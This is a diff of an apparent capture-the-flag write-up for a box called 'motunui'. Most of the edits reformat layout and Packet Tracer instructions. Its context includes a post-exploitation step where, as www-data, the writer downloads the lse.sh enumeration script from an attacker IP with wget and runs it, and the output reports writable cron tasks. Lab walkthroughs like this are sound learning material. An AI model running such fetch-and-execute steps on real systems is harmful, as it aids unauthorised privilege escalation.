@@ -768,11 +768,10 @@ www-data@motunui:/etc$ python3 -m http.server
 www-data@motunui:~$ wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1
 ```
 
-<img width="1150" height="455" alt="image" src="https://github.com/user-attachments/assets/de88c9d6-b8ab-4f93-8e62-e7cde4136b49" />
+<br>
+<br>
 
-<br>
-<br>
-<br>
+<img width="1150" height="455" alt="image" src="https://github.com/user-attachments/assets/de88c9d6-b8ab-4f93-8e62-e7cde4136b49" />
 
 ```bash
 [!] ret010 Cron tasks writable by user..................................... yes!
@@ -842,7 +841,15 @@ t.pkt: data
 - click download Packet Tracer<br>
 - continue following the instructions on Cisco Resource Hub page</p>
 
-<p align="center">Launch <code>Packet Tracer</code>. Cclick <code>File</code> > <code>Open</code>. Choose <ins>t.pkt</ins>. Click <code>Open</code><br><br>1 . Double-click the switch<br>2 . navigate to the <code>CLI</code>.<br>3 . [ENTER] and a <code>Switch></code> will show up. Type <code>enable<code>. <br>[ENTER] and a <code>Switch#</code> prompt will show up.<br><br>4 . type <code>show running-config</code>. [ENTER].</p>
+
+<p align="center">Using Packet Tracer</p>
+<p>
+	
+- Launch <code>Packet Tracer</code>. Click <code>File</code> > <code>Open</code>. Choose <ins>t.pkt</ins>. Click <code>Open</code><br>
+- 1 . Double-click the switch<br>
+- 2 . navigate to the <code>CLI</code>.<br>
+- 3 . [ENTER] and a <code>Switch></code> will show up. Type <code>enable<code>. [ENTER] and a <code>Switch#</code> prompt will show up.<br>
+- 4 . type <code>show running-config</code>. [ENTER].</p>
 
 <img width="1623" height="858" alt="image" src="https://github.com/user-attachments/assets/5ddec520-26cd-436f-a803-cd28c1009e04" />
 
